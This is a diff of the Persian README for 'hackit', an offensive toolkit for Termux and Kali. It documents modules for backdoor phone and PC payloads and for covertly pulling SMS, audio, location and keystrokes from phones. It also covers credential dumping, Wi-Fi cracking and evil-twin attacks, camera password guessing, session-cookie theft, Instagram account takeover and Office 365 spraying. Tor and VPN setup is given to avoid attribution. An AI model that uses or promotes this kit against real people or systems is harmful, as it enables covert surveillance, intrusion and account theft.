@@ -1,7 +1,3 @@
-# Hacking
-
-<div align="center">
-
 # hackit
 
 جعبه‌ابزار تهاجمی خط فرمان — ترموکس و کالی
@@ -55,10 +51,10 @@ hackit یک dispatcher خط فرمان است.
 
 قبل از هر تست:
 
-```bash
-curl -s https://TARGET/security.txt
-curl -s https://TARGET/.well-known/security.txt
-curl -s https://TARGET/robots.txt
+    curl -s https://TARGET/security.txt
+    curl -s https://TARGET/.well-known/security.txt
+    curl -s https://TARGET/robots.txt
+
 ## دستورهای غیرقانونی
 
 بدون اجازه‌ی کتبی ریسک واقعی دارند:
@@ -91,675 +87,448 @@ curl -s https://TARGET/robots.txt
 - VPS — برای اسکن سنگین و شنونده. آی‌پی ثابت و قابل انتساب.
 
 بهترین ترکیب: VPS + VPN.
-### چرا مخفی می‌شوی
 
-دو دلیل جدا:
+    pkg install tor proxychains4
+    sudo apt install tor proxychains4
+    tor &
+    proxychains4 curl -s ifconfig.me
 
-1. **فیلتر** — برای دسترسی به اینستاگرام، واتساپ، تلگرام و خیلی از منابع، از ایران بدون فیلترشکن هیچ‌کاری پیش نمی‌رود.
-2. **انتساب** — آی‌پی تو در لاگ طرف می‌ماند.
+اگر آی‌پی عوض شد، Tor کار می‌کند.
 
-### Tor
+    proxychains4 nmap -sT -Pn example.com -p 80,443
 
-Tor یک SOCKS5 روی پورت ۹۰۵۰ باز می‌کند. ابزارها را از آن رد می‌کنی.
+-sT چون SYN خام از SOCKS رد نمی‌شود.
 
-```bash
-pkg install tor proxychains4       # ترموکس
-sudo apt install tor proxychains4  # کالی
+-Pn چون ICMP از Tor رد نمی‌شود.
 
-tor &                              # روشن کردن، در پس‌زمینه
-curl -s ifconfig.me                # بدون Tor، آی‌پی واقعی
-proxychains4 curl -s ifconfig.me   # با Tor، آی‌پی خروجی Tor
-```
+در /etc/proxychains4.conf:
 
-اگر دو خط آخر دو آی‌پی متفاوت داد، Tor کار می‌کند.
+    socks5 127.0.0.1 9050
 
-**نمونه‌ی واقعی:**
+قواعد:
 
-```bash
-proxychains4 curl -s https://example.com
-proxychains4 nmap -sT -Pn example.com -p 80,443
-```
-
-**چرا `-sT` و `-Pn`:**
-
-- `-sT` — اتصال کامل TCP. `-sS` (SYN خام) از SOCKS رد نمی‌شود و با Tor کار نمی‌کند.
-- `-Pn` — پینگ ICMP از Tor رد نمی‌شود، پس nmap نباید اول پینگ بزند وگرنه می‌گوید هاست خاموش است.
-
-**در `proxychains4.conf` باید این باشد:**
-
-```bash
-sudo nano /etc/proxychains4.conf
-# آخر فایل:
-socks5 127.0.0.1 9050
-```
-
-**محدودیت‌ها:**
-
-- Tor کند است. برای اسکن انبوه مناسب نیست.
-- اکثر سایت‌های بزرگ exit node را بلاک می‌کنند → کپچا و ۴۰۳
-- `masscan` و `hping3` با Tor کار نمی‌کنند (بسته‌ی خام می‌فرستند)
-- برای آنها VPN یا VPS لازم است
-
-### VPN
-
-```bash
-sudo openvpn --config vpn.ovpn
-curl -s ifconfig.me                  # تأیید آی‌پی
-```
-
-VPN رایگان برای کار جدی نگیر — لاگ دارند و آی‌پی‌شان سوخته است.
-
-### پروکسی برای ابزارهای تک
-
-```bash
-curl --proxy socks5://127.0.0.1:9050 https://TARGET
-nuclei -u https://TARGET -proxy http://127.0.0.1:8080
-ffuf -u https://TARGET/FUZZ -w list.txt -x http://127.0.0.1:8080
-```
-
-### قواعد
-
-- **وسط اسکن آی‌پی عوض نکن** — سشن می‌شکند و لاگ‌ها بی‌معنی می‌شوند
-- **با اکانت شخصی لاگین نکن** وقتی از VPN استفاده می‌کنی؛ اینستاگرام کوکی را به آی‌پی گره می‌زند و اکانتت بن می‌شود
-- **DNS leak** را چک کن: `curl -s https://1.1.1.1/cdn-cgi/trace`
-- **`security.txt` را همیشه بخوان** — اگر سایت برنامه‌ی باگ‌بانتی دارد، مخفی شدن لازم نیست و حتی به نفع توست که قابل انتساب باشی
-- برای `masscan` و `hping3` حتماً VPN یا VPS — از آی‌پی خانگی، سایت خودت را هم می‌توانی قطع کنی
-
-## دستورهای غیرقانونی
-
-این‌ها بدون اجازه‌ی کتبی، ریسک واقعی دارند:
-
-| دستور | چرا |
-|---|---|
-| `hack website-hack sqli` | تزریق روی دیتابیس طرف |
-| `hack website-hack nuclei` | اسکن CVE |
-| `hack website-hack dirs` | دسترسی به مسیرهای پنهان |
-| `hack website-hack login` | تلاش رمز |
-| `hack website-hack upload` | نوشتن فایل روی سرور |
-| `hack website-hack ddos` | تولید بار، امکان اختلال |
-| `hack android-hack adb-connect` | ورود به گوشی بدون اطلاع مالک |
-| `hack android-hack payload` | نصب بکدور |
-| `hack windows-hack payload` | نصب بکدور |
-| `hack windows-hack wmi` / `uac` / `persist` | کنترل و ماندگاری |
-| `hack wifi-hack handshake` / `pmkid` / `wps` | کرک شبکه‌ی دیگران |
-| `hack wifi-hack evil` | ایول‌توین |
-| `hack wifi-hack deauth` | قطع کاربران |
-| `hack camera-hack default` | تلاش رمز دوربین |
-| `hack messenger-hack session` | فیشینگ و تصاحب اکانت |
-| `hack email-hack spray` | تلاش رمز روی آفیس۳۶۵ |
-| `hack mitm-hack arp` / `dns` / `captive` | شنود ترافیک دیگران |
-| `hack password-hack hydra` | بروت‌فورس |
-
-و این‌ها تقریباً بی‌خطرند: `osint-hack`، `email-hack enumerate`، `social-hack ig-enum`، `ip-hack dns`، `website-hack headers`، همه‌ی `reverse-hack`.
+- وسط اسکن آی‌پی عوض نکن
+- با اکانت شخصی لاگین نکن
+- masscan و hping3 با Tor کار نمی‌کنند
+- برای آنها VPN یا VPS
 
 ## نصب
 
-### پیش‌نیاز عمومی
+پیش‌نیاز ترموکس: Termux از F-Droid، Termux:API، golang.
 
-| مورد | ترموکس | کالی |
-|---|---|---|
-| ترمینال | Termux از F-Droid | ترمینال عادی |
-| دسترسی | اختیاری (برای وای‌فای لازم) | `sudo` |
-| Termux:API | **الزامی** برای دوربین/میکروفن/موقعیت | — |
-| Python | `pkg install python` | از پیش هست |
-| Go | `pkg install golang` | `apt install golang` |
+پیش‌نیاز کالی: root، golang.
 
-### نصب خودکار
+    git clone https://github.com/hamidam-dev/Hacking.git ~/hack2
+    cd ~/hack2
+    chmod +x hack install.sh update.sh
+    hack install
 
-```bash
-git clone <your-private-repo> ~/hackit
-cd ~/hackit
-chmod +x hack install.sh
-bash install.sh
-```
+بررسی:
 
-### نصب دستی پیش‌نیاز هر دسته
+    hack doctor
 
-| دسته | پیش‌نیاز |
-|---|---|
-| android-hack | `adb` (`android-tools`)، `scrcpy`، Termux:API |
-| windows-hack | `msfvenom`، `msfconsole`، `impacket`، `xfreerdp` |
-| linux-hack | `nmap`، `ssh`، `curl` |
-| website-hack | `subfinder`، `httpx`، `nuclei`، `ffuf`، `sqlmap`، `dalfox`، `wafw00f` |
-| ip-hack | `nmap`، `masscan`، `dig`، `whois`، `shodan` |
-| wifi-hack | `aircrack-ng`، `hcxdumptool`، `hcxtools`، `reaver`، کارت با monitor mode |
-| camera-hack | `nmap`، `ffmpeg`، `curl`، `hydra` |
-| messenger-hack | `frida`، `mitmproxy`، `nodejs`، `python` |
-| social-hack | `instaloader`، `toutatis`، `sherlock`، `maigret` |
-| email-hack | `holehe`، `ghunt`، `o365spray` |
-| osint-hack | `exiftool`، `phoneinfoga`، `tesseract` |
-| reverse-hack | `jadx`، `apktool`، `apkleaks`، `frida`، `objection` |
-| mitm-hack | `mitmproxy`، `bettercap`، `ngrok` |
-| password-hack | `hydra`، `hashcat`، `john`، `cupp` |
-| c2-hack | `msfvenom`، `msfconsole`، `ngrok` |
+اگر نصب شکست خورد:
 
-### نکات نصب روی ترموکس
+    cat /tmp/hackit-install.log | tail -30
 
-بعضی بسته‌ها از مخزن رسمی ترموکس حذف شده‌اند. اینها با `pkg install` نصب نمی‌شوند:
+اگر apt خراب بود:
 
-| بسته | راه |
-|---|---|
-| `hydra` | کالی با `proot-distro` |
-| `metasploit` | کالی با `proot-distro` |
-| `aircrack-ng` | بسته‌ی `.deb` از [مخزن جانشین](https://github.com/pitube08642/aircrack-ng-for-termux) |
+    apt-get install -y --allow-downgrades postgresql-client-common postgresql-common
+    apt-get -f install -y
+    apt-get check
 
-اگر پایتون ۳.۱۴ داری و `pip install` روی `cryptography` شکست خورد:
+### ترموکس
 
-```bash
-pkg install -y python-cryptography
-pip install mitmproxy
-```
+سه بسته از مخزن حذف شده‌اند:
 
-ساخت از سورس روی `i686` کند و شکننده است. نسخه‌ی آماده را ترجیح بده.
+- aircrack-ng — از مخزن جانشین
+- hydra — دبیان با proot-distro
+- metasploit — دبیان با proot-distro
 
-#### کالی داخل ترموکس
+    pkg install -y wget
+    cd ~
+    curl -LO https://raw.githubusercontent.com/pitube08642/aircrack-ng-for-termux/main/dists/termux/aircrack-ng/binary-i686/aircrack-ng_3_1.7_i686.deb
+    dpkg -i aircrack-ng_3_1.7_i686.deb
 
-برای ابزارهای سنگین، به‌جای ساخت دستی:
+pkg install را چندتایی در یک خط نزن.
 
-```bash
-pkg install -y proot-distro
-proot-distro install kali
-proot-distro login kali
-apt update
-apt install -y hydra metasploit-framework aircrack-ng
-```
+proot-distro install kali کار نمی‌کند. از debian استفاده کن:
 
-خروج: `exit`
+    pkg install -y proot-distro
+    proot-distro install debian
+    proot-distro login debian
+    apt update
+    apt install -y hydra metasploit-framework aircrack-ng mitmproxy
 
-محدودیت: مانیتور مود در شبیه‌ساز همچنان کار نمی‌کند. `aircrack-ng` نصب می‌شود ولی وای‌فای واقعی ندارد.
+اگر mitmproxy روی i686 شکست خورد:
 
-#### معماری ۳۲ بیتی
+    pkg install -y rust binutils
+    pip install mitmproxy
 
-`uname -m` اگر `i686` داد، انتظار شکست داشته باش. بیشتر ابزارهای گو و پایتون چرخ آماده ندارند.
+اگر uname -m مقدار i686 داد، شبیه‌ساز x86_64 یا ماشین مجازی بهتر است.
 
-راه‌حل: شبیه‌ساز `x86_64` با اندروید ۱۱ یا بالاتر.
+خطای py3compile هنگام نصب بسته‌های پایتون بی‌خطر است.
 
-### بررسی سلامت محیط
+### نصب دستی
 
-```bash
-hack doctor
-```
+- android-hack — adb، scrcpy، Termux:API
+- windows-hack — msfvenom، msfconsole، impacket، xfreerdp
+- website-hack — subfinder، httpx، nuclei، ffuf، sqlmap، dalfox، wafw00f
+- ip-hack — nmap، masscan، dig، whois
+- wifi-hack — aircrack-ng، hcxdumptool، hcxtools، reaver
+- messenger-hack — frida، mitmproxy، nodejs
+- social-hack — instaloader، toutatis، sherlock، maigret
+- email-hack — holehe، ghunt، o365spray
+- osint-hack — exiftool، phoneinfoga، tesseract
+- reverse-hack — jadx، apktool، apkleaks، objection
+- mitm-hack — mitmproxy، bettercap، ngrok
+- password-hack — hydra، hashcat، john، cupp
+
+## به‌روزرسانی
+
+    hack update
+
+دستی:
+
+    cd ~/hack2
+    git stash
+    git pull
+    git stash pop
+    chmod +x hack install.sh update.sh
+
+اگر git pull تداخل داد:
+
+    git checkout -- hack
+    git pull
+    chmod +x hack
+
+git pull بیت اجرا را پاک می‌کند. همیشه بعدش chmod بزن.
+
+### دستورهای خود مخزن
+
+- hack list — فهرست دسته‌ها
+- hack install — نصب خودکار
+- hack update — به‌روزرسانی
+- hack doctor — بررسی محیط
+- hack version — نسخه
 
 ## ساختار
 
-```
-hackit/
-├── hack                  dispatcher
-├── install.sh
-├── lib/common.sh         توابع مشترک
-├── lib/detect.sh         تشخیص محیط
-├── conf/deps.txt         فهرست وابستگی
-├── docs/REALITY.md       چه چیزی ممکن است
-├── docs/WORKFLOW.md      ترتیب درست کار
-└── <دسته>-hack/
-    ├── category.conf     عنوان + فهرست ماژول
-    └── <ماژول>.sh        DESC / REQ / RISK / NOTE + termux() + kali()
-```
+    hackit/
+    ├── hack
+    ├── install.sh
+    ├── update.sh
+    ├── lib/common.sh
+    ├── lib/detect.sh
+    ├── conf/deps.txt
+    ├── docs/REALITY.md
+    ├── docs/WORKFLOW.md
+    └── <دسته>-hack/
+        ├── category.conf
+        └── <ماژول>.sh
 
-## نحوه‌ی استفاده
+## استفاده
 
-```bash
-hack list                              # فهرست دسته‌ها
-hack website-hack                      # منوی ماژول‌ها
-hack website-hack nuclei               # نمایش دستورها
-hack website-hack nuclei --run         # اجرا
-hack wifi-hack handshake --both        # هر دو روش
-hack android-hack camera --kali        # اجبار به روش کالی
-hack doctor                            # بررسی محیط
-```
-### جای‌گذاری مقادیر
+    hack list
+    hack website-hack
+    hack website-hack nuclei
+    hack website-hack nuclei --run
+    hack wifi-hack handshake --both
+    hack android-hack camera --kali
 
-هر جا در دستورها این کلمه‌ها را دیدی، **باید با مقدار واقعی عوضشان کنی**. اگر عین کلمه را بزنی، خطا می‌گیری.
+پرچم‌ها:
 
-| جای‌نگهدار | معنی | نمونه |
-|---|---|---|
-| `TARGET` | دامنه‌ی هدف، بدون `https://` | `example.com` |
-| `URL` | آدرس کامل | `https://example.com/page?id=1` |
-| `IP` | آی‌پی هدف | `192.168.1.50` |
-| `PORT` | پورت سرویس | `443` |
-| `USER` | نام کاربری | `admin` |
-| `PASS` | رمز | `admin` |
-| `BSSID` | مک‌آدرس روتر | `AA:BB:CC:DD:EE:FF` |
-| `CHANNEL` | کانال وای‌فای | `6` |
-| `IFACE` | نام کارت شبکه | `wlan0` |
-| `SERVER` | آی‌پی سرور شنونده | `1.2.3.4` |
-| `WORDLIST` | مسیر وردلیست | `/usr/share/wordlists/rockyou.txt` |
-| `TOKEN` | توکن API | `abc123` |
+- --run — اجرای واقعی
+- --termux — اجبار ترموکس
+- --kali — اجبار کالی
+- --both — هر دو روش
 
-### نمونه‌ی درست و غلط
+## جای‌گذاری مقادیر
 
-| غلط | درست |
-|---|---|
-| `nmap -sV TARGET` | `nmap -sV example.com` |
-| `nuclei -u https://TARGET` | `nuclei -u https://example.com` |
-| `sqlmap -u "URL"` | `sqlmap -u "https://example.com/p.php?id=1"` |
-| `hydra ... ssh://IP` | `hydra ... ssh://192.168.1.50` |
-| `ffuf -u https://TARGET/FUZZ -w WORDLIST` | `ffuf -u https://example.com/FUZZ -w ~/wordlists/common.txt` |
+این کلمه‌ها را با مقدار واقعی عوض کن:
 
-| پرچم | کار |
-|---|---|
-| `--run` | اجرای واقعی |
-| `--termux` | اجبار به روش ترموکس |
-| `--kali` | اجبار به روش کالی |
-| `--both` | هر دو روش |
+- TARGET — دامنه، بدون https. نمونه: example.com
+- URL — آدرس کامل. نمونه: https://example.com/p.php?id=1
+- IP — آی‌پی هدف. نمونه: 192.168.1.50
+- PORT — پورت. نمونه: 443
+- USER — نام کاربری. نمونه: admin
+- PASS — رمز. نمونه: admin
+- BSSID — مک روتر. نمونه: AA:BB:CC:DD:EE:FF
+- CHANNEL — کانال. نمونه: 6
+- IFACE — کارت شبکه. نمونه: wlan0
+- SERVER — سرور شنونده. نمونه: 1.2.3.4
+- WORDLIST — وردلیست. نمونه: /usr/share/wordlists/rockyou.txt
+- TOKEN — توکن API. نمونه: abc123
+
+غلط و درست:
+
+- nmap -sV TARGET ← nmap -sV example.com
+- sqlmap -u "URL" ← sqlmap -u "https://example.com/p.php?id=1"
+- hydra ssh://IP ← hydra ssh://192.168.1.50
 
 ## دستورها
 
 ### android-hack
 
-| دستور | کار | پیش‌نیاز | حقوقی |
-|---|---|---|---|
-| `adb-connect` | اتصال ADB بی‌سیم به گوشی | دیباگ بی‌سیم روشن | HIGH |
-| `camera` | عکس از دوربین جلو/عقب | ADB + اپ دوربین بازشده | LOW |
-| `screen` | اسکرین‌شات از صفحه | ADB | LOW |
-| `scrcpy` | میرور زنده + کنترل | `scrcpy` | LOW |
-| `contacts` | خروجی مخاطبین | ADB | LOW |
-| `sms` | خواندن پیامک | ADB | MED |
-| `mic` | ضبط صدا | ADB + مجوز ضبط | LOW |
-| `files` | کشیدن فایل | ADB | MED |
-| `loc` | موقعیت مکانی | ADB + Location روشن | LOW |
-| `apps` | لیست اپ و دیتا | ADB | MED |
-| `payload` | ساخت APK بکدور | `msfvenom` + IP عمومی | HIGH |
-| `nearby` | کشف گوشی‌های هم‌شبکه | `nmap` | LOW |
-| `clipboard` | خواندن کلیپ‌بورد | ADB | LOW |
-| `keylog` | ثبت کلیدها | ADB | MED |
-
-```bash
-hack android-hack adb-connect
-# ۱. روی هدف: تنظیمات > گزینه‌های توسعه‌دهنده > Wireless debugging
-# ۲. adb pair IP:PORT  → کد ۶ رقمی
-# ۳. adb connect IP:PORT
-```
+- adb-connect — اتصال ADB بی‌سیم. پیش‌نیاز: دیباگ بی‌سیم. HIGH
+- camera — عکس از دوربین. پیش‌نیاز: ADB. LOW
+- screen — اسکرین‌شات. ADB. LOW
+- scrcpy — میرور زنده. scrcpy. LOW
+- contacts — مخاطبین. ADB. LOW
+- sms — پیامک. ADB. MED
+- mic — ضبط صدا. ADB. LOW
+- files — کشیدن فایل. ADB. MED
+- loc — موقعیت. ADB. LOW
+- apps — لیست اپ. ADB. MED
+- payload — APK بکدور. msfvenom. HIGH
+- nearby — گوشی‌های هم‌شبکه. nmap. LOW
+- clipboard — کلیپ‌بورد. ADB. LOW
+- keylog — ثبت کلید. ADB. MED
 
 ### windows-hack
 
-| دستور | کار | پیش‌نیاز | حقوقی |
-|---|---|---|---|
-| `payload` | ساخت EXE بکدور + شنونده | `msfvenom` + IP عمومی | HIGH |
-| `webcam` | عکس از وبکم | session فعال | LOW |
-| `screen` | دیدن صفحه | session فعال | LOW |
-| `keys` | کی‌لاگر | session فعال | MED |
-| `files` | کشیدن فایل | session فعال | MED |
-| `creds` | استخراج رمز ذخیره‌شده | session SYSTEM | HIGH |
-| `sam` | dump هش SAM | دسترسی ادمین | HIGH |
-| `rdp` | اتصال دسکتاپ راه دور | پورت ۳۳۸۹ + رمز | LOW |
-| `smb` | بررسی و بهره‌برداری SMB | پورت ۴۴۵ | HIGH |
-| `wmi` | اجرای دستور از راه دور | اعتبارنامه ادمین | HIGH |
-| `uac` | دور زدن UAC | session | HIGH |
-| `persist` | ماندگاری | session SYSTEM | HIGH |
-
-```bash
-hack windows-hack payload
-# LHOST به‌صورت خودکار از ifconfig.me پر می‌شود
-# داخل session: webcam_snap / screenshot / keyscan_start / hashdump
-```
+- payload — EXE بکدور. msfvenom. HIGH
+- webcam — وبکم. session. LOW
+- screen — صفحه. session. LOW
+- keys — کی‌لاگر. session. MED
+- files — فایل. session. MED
+- creds — رمز ذخیره‌شده. SYSTEM. HIGH
+- sam — هش SAM. ادمین. HIGH
+- rdp — RDP. پورت ۳۳۸۹. LOW
+- smb — SMB. پورت ۴۴۵. HIGH
+- wmi — دستور از راه دور. ادمین. HIGH
+- uac — دور زدن UAC. session. HIGH
+- persist — ماندگاری. SYSTEM. HIGH
 
 ### linux-hack
 
-| دستور | کار | پیش‌نیاز | حقوقی |
-|---|---|---|---|
-| `enum` | enumeration کامل | shell روی هدف | LOW |
-| `privesc` | مسیرهای ارتقای دسترسی | shell | HIGH |
-| `ssh` | اتصال یا بروت‌فورس | پورت ۲۲ | HIGH |
-| `suid` | سوءاستفاده SUID | shell | HIGH |
-| `cron` | سوءاستفاده کران | shell | HIGH |
-| `creds` | جستجوی رمز در فایل | shell | MED |
-| `docker` | فرار از کانتینر | shell داخل کانتینر | HIGH |
-| `payload` | بکدور ELF | `msfvenom` | HIGH |
+- enum — enumeration. shell. LOW
+- privesc — ارتقای دسترسی. shell. HIGH
+- ssh — بروت‌فورس SSH. پورت ۲۲. HIGH
+- suid — سوءاستفاده SUID. shell. HIGH
+- cron — سوءاستفاده کران. shell. HIGH
+- creds — جستجوی رمز. shell. MED
+- docker — فرار از کانتینر. shell. HIGH
+- payload — ELF بکدور. msfvenom. HIGH
 
 ### website-hack
 
-| دستور | کار | پیش‌نیاز | حقوقی |
-|---|---|---|---|
-| `recon` | شناسایی سطح حمله | `subfinder` `httpx` | MED |
-| `subdomain` | کشف زیردامنه | `subfinder` | LOW |
-| `fingerprint` | تشخیص تکنولوژی | `whatweb` `httpx` | LOW |
-| `waf` | تشخیص فایروال | `wafw00f` | LOW |
-| `dork` | گوگل‌دورک | — | LOW |
-| `dirs` | کشف مسیر پنهان | `ffuf` `gobuster` | HIGH |
-| `params` | کشف پارامتر | `arjun` | MED |
-| `nuclei` | اسکن CVE | `nuclei` | HIGH |
-| `sqli` | تزریق SQL | `sqlmap` | HIGH |
-| `xss` | XSS | `dalfox` | HIGH |
-| `lfi` | path traversal | `curl` | HIGH |
-| `ssrf` | SSRF | `interactsh` | HIGH |
-| `upload` | دور زدن آپلود | `curl` | HIGH |
-| `login` | حمله به فرم لاگین | `hydra` | HIGH |
-| `jwt` | حمله به JWT | `jwt_tool` | HIGH |
-| `cms` | اسکن وردپرس/جوملا | `wpscan` | HIGH |
-| `ddos` | تست بار | `ab` `hping3` | MED |
-| `headers` | بررسی هدر امنیتی | `curl` | LOW |
-
-```bash
-hack website-hack recon
-hack website-hack nuclei --run
-# نرخ پیش‌فرض پایین است. روی سایت بزرگ: -rl 100
-```
+- recon — سطح حمله. subfinder و httpx. MED
+- subdomain — زیردامنه. subfinder. LOW
+- fingerprint — تکنولوژی. whatweb. LOW
+- waf — فایروال. wafw00f. LOW
+- dork — گوگل‌دورک. بدون پیش‌نیاز. LOW
+- dirs — مسیر پنهان. ffuf. HIGH
+- params — پارامتر. arjun. MED
+- nuclei — CVE. nuclei. HIGH
+- sqli — SQLi. sqlmap. HIGH
+- xss — XSS. dalfox. HIGH
+- lfi — path traversal. curl. HIGH
+- ssrf — SSRF. interactsh. HIGH
+- upload — دور زدن آپلود. curl. HIGH
+- login — فرم لاگین. hydra. HIGH
+- jwt — JWT. jwt_tool. HIGH
+- cms — CMS. wpscan. HIGH
+- ddos — تست بار. ab. MED
+- headers — هدر امنیتی. curl. LOW
 
 ### ip-hack
 
-| دستور | کار | پیش‌نیاز | حقوقی |
-|---|---|---|---|
-| `scan` | اسکن پورت و سرویس | `nmap` | MED |
-| `ping` | کشف میزبان زنده | `nmap` | LOW |
-| `os` | تشخیص سیستم‌عامل | `nmap` | MED |
-| `shodan` | جستجوی Shodan | API key | LOW |
-| `masscan` | اسکن انبوه رنج | `masscan` | HIGH |
-| `banner` | گرفتن بنر | `nc` | MED |
-| `snmp` | بررسی SNMP | `snmpwalk` | MED |
-| `dns` | تحلیل DNS | `dig` | LOW |
-| `traceroute` | مسیر شبکه | `traceroute` | LOW |
-| `arp` | اسکن ARP در LAN | `arp-scan` | LOW |
+- scan — پورت. nmap. MED
+- ping — میزبان زنده. nmap. LOW
+- os — سیستم‌عامل. nmap. MED
+- shodan — Shodan. API key. LOW
+- masscan — اسکن انبوه. masscan. HIGH
+- banner — بنر. nc. MED
+- snmp — SNMP. snmpwalk. MED
+- dns — DNS. dig. LOW
+- traceroute — مسیر. traceroute. LOW
+- arp — ARP. arp-scan. LOW
 
 ### wifi-hack
 
-| دستور | کار | پیش‌نیاز | حقوقی |
-|---|---|---|---|
-| `scan` | اسکن شبکه‌های اطراف | monitor mode | LOW |
-| `handshake` | گرفتن هندشیک WPA | monitor + کلاینت فعال | HIGH |
-| `pmkid` | گرفتن PMKID | `hcxdumptool` | HIGH |
-| `crack` | کرک هش | `hashcat` + وردلیست | LOW |
-| `wps` | حمله WPS | `reaver` | HIGH |
-| `evil` | ایول‌توین | `wifiphisher` | HIGH |
-| `deauth` | قطع کاربر | `aireplay-ng` | MED |
-| `wep` | کرک WEP | `aircrack-ng` | MED |
-| `monitor` | فعال/غیرفعال مانیتور | root | LOW |
-
-```bash
-hack wifi-hack monitor
-hack wifi-hack scan
-hack wifi-hack handshake --both
-```
+- scan — اسکن شبکه. monitor mode. LOW
+- handshake — هندشیک. monitor و کلاینت. HIGH
+- pmkid — PMKID. hcxdumptool. HIGH
+- crack — کرک هش. hashcat. LOW
+- wps — WPS. reaver. HIGH
+- evil — ایول‌توین. wifiphisher. HIGH
+- deauth — قطع کاربر. aireplay-ng. MED
+- wep — WEP. aircrack-ng. MED
+- monitor — مانیتور مود. root. LOW
 
 ### camera-hack
 
-| دستور | کار | پیش‌نیاز | حقوقی |
-|---|---|---|---|
-| `discover` | کشف دوربین در شبکه | `nmap` | LOW |
-| `default` | پسورد پیش‌فرض | `hydra` | HIGH |
-| `rtsp` | دسترسی به استریم | `ffmpeg` | MED |
-| `snapshot` | عکس از دوربین IP | `curl` | LOW |
-| `webcam-phone` | دوربین گوشی هدف | ADB یا session | LOW |
-| `webcam-pc` | وبکم کامپیوتر هدف | session | LOW |
-| `ddns` | دوربین‌های عمومی | Shodan | LOW |
+- discover — کشف دوربین. nmap. LOW
+- default — رمز پیش‌فرض. hydra. HIGH
+- rtsp — استریم. ffmpeg. MED
+- snapshot — عکس. curl. LOW
+- webcam-phone — دوربین گوشی. ADB. LOW
+- webcam-pc — وبکم. session. LOW
+- ddns — دوربین عمومی. Shodan. LOW
 
 ### messenger-hack
 
-| دستور | کار | پیش‌نیاز | حقوقی |
-|---|---|---|---|
-| `wa-enum` | تشخیص شماره در واتساپ | `ignorant` | LOW |
-| `wa-clone` | کلاینت غیررسمی | Node یا Go | ToS |
-| `wa-analyze` | آنالیز ترافیک | `frida` `mitmproxy` | MED |
-| `tg-enum` | تشخیص اکانت تلگرام | `curl` | LOW |
-| `tg-clone` | کاربربات | `telethon` | ToS |
-| `tg-archive` | آرشیو کانال | `telethon` | ToS |
-| `rubika` | آنالیز روبیکا | `apk-mitm` | ToS |
-| `bale` | آنالیز بله | `apk-mitm` | ToS |
-| `session` | دزدیدن کوکی سشن | دامنه + VPS | HIGH |
-
-```bash
-hack messenger-hack session
-# پیش‌نیاز: دامنه، رکورد A، Let's Encrypt، پورت ۴۴۳
-```
+- wa-enum — شماره واتساپ. ignorant. LOW
+- wa-clone — کلاینت غیررسمی. Node. ToS
+- wa-analyze — آنالیز ترافیک. frida. MED
+- tg-enum — اکانت تلگرام. curl. LOW
+- tg-clone — کاربربات. telethon. ToS
+- tg-archive — آرشیو کانال. telethon. ToS
+- rubika — آنالیز روبیکا. apk-mitm. ToS
+- bale — آنالیز بله. apk-mitm. ToS
+- session — دزدیدن سشن. دامنه و VPS. HIGH
 
 ### social-hack
 
-| دستور | کار | پیش‌نیاز | حقوقی |
-|---|---|---|---|
-| `ig-enum` | شناسایی پروفایل | `toutatis` | LOW |
-| `ig-dump` | دانلود محتوا | `instaloader` | ToS |
-| `ig-analyze` | آنالیز ترافیک | `frida` `mitmproxy` | MED |
-| `ig-session` | تصاحب اکانت | `evilginx2` | HIGH |
-| `fb-enum` | شناسایی فیس‌بوک | `curl` | LOW |
-| `x-enum` | شناسایی ایکس | `curl` | LOW |
-| `tiktok` | شناسایی تیک‌تاک | `curl` | LOW |
-| `username` | ردیابی یوزرنیم | `maigret` | LOW |
+- ig-enum — پروفایل. toutatis. LOW
+- ig-dump — دانلود محتوا. instaloader. ToS
+- ig-analyze — آنالیز ترافیک. frida. MED
+- ig-session — تصاحب اکانت. evilginx2. HIGH
+- fb-enum — فیس‌بوک. curl. LOW
+- x-enum — ایکس. curl. LOW
+- tiktok — تیک‌تاک. curl. LOW
+- username — ردیابی یوزرنیم. maigret. LOW
 
 ### email-hack
 
-| دستور | کار | پیش‌نیاز | حقوقی |
-|---|---|---|---|
-| `enumerate` | کشف اکانت‌های ثبت‌شده | `holehe` | LOW |
-| `ghunt` | OSINT گوگل | `ghunt` + کوکی | LOW |
-| `spray` | اسپری آفیس۳۶۵ | `o365spray` | HIGH |
-| `verify` | اعتبارسنجی ایمیل | `dig` | LOW |
-| `breach` | بررسی لو رفتن | API key | LOW |
-| `header` | تحلیل هدر | `parsedmarc` | LOW |
-| `smtp` | بررسی SMTP | `swaks` | MED |
+- enumerate — اکانت‌های ثبت‌شده. holehe. LOW
+- ghunt — OSINT گوگل. ghunt. LOW
+- spray — اسپری آفیس۳۶۵. o365spray. HIGH
+- verify — اعتبارسنجی. dig. LOW
+- breach — لو رفتن. API key. LOW
+- header — تحلیل هدر. parsedmarc. LOW
+- smtp — SMTP. swaks. MED
 
 ### osint-hack
 
-| دستور | کار | پیش‌نیاز | حقوقی |
-|---|---|---|---|
-| `phone` | اطلاعات شماره | `phoneinfoga` | LOW |
-| `name` | جستجوی نام | `maigret` | LOW |
-| `image` | جستجوی معکوس تصویر | — | LOW |
-| `geoloc` | مکان‌یابی از تصویر | `tesseract` | LOW |
-| `metadata` | استخراج متادیتا | `exiftool` | LOW |
-| `domain` | اطلاعات دامنه | `whois` | LOW |
-| `paste` | جستجوی لیک | `curl` | LOW |
-| `people` | جستجوی افراد | `sherlock` | LOW |
+- phone — شماره. phoneinfoga. LOW
+- name — نام. maigret. LOW
+- image — تصویر معکوس. بدون پیش‌نیاز. LOW
+- geoloc — مکان‌یابی. tesseract. LOW
+- metadata — متادیتا. exiftool. LOW
+- domain — دامنه. whois. LOW
+- paste — لیک. curl. LOW
+- people — افراد. sherlock. LOW
 
 ### reverse-hack
 
-| دستور | کار | پیش‌نیاز | حقوقی |
-|---|---|---|---|
-| `apk-static` | آنالیز استاتیک APK | `MobSF` `apkid` | LOW |
-| `apk-secrets` | استخراج سکرت | `apkleaks` | LOW |
-| `decompile` | دیکامپایل | `jadx` | LOW |
-| `frida` | هوک رانتایم | `frida-tools` | MED |
-| `pinning` | دور زدن SSL pinning | `objection` | MED |
-| `exe` | آنالیز فایل ویندوز | `pefile` | LOW |
-| `js` | دی‌ابفاسکیت | `jsbeautifier` | LOW |
+- apk-static — آنالیز APK. MobSF. LOW
+- apk-secrets — استخراج سکرت. apkleaks. LOW
+- decompile — دیکامپایل. jadx. LOW
+- frida — هوک. frida-tools. MED
+- pinning — دور زدن pinning. objection. MED
+- exe — فایل ویندوز. pefile. LOW
+- js — دی‌ابفاسکیت. jsbeautifier. LOW
 
